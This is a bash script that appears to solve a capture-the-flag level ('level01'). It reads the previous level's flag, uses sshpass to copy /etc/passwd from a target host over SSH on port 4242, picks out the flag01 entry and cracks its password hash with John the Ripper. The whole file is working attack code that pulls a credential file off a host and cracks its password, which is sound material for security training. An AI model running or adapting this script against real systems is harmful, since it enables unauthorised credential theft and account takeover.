#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level01@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level00/flag)

FILE=hash

if [ $# -eq 1 ]; then
	if [ ! -f $FILE ]; then
		sshpass -p $PASSWORD scp -q -P $SSHPORT $HOST:/etc/passwd $FILE
		echo "[+] Import /etc/passwd."
	fi
	echo "[+] $(cat $FILE | grep flag01)"
	#john $FILE
	printf "[+] Passwd = "
	john --show $FILE | head -n 1 | cut -d ":" -f 2

	rm -f $FILE
else
	printf "usage: ./script [host]\n\texample host: 192.168.1.130"
fi	
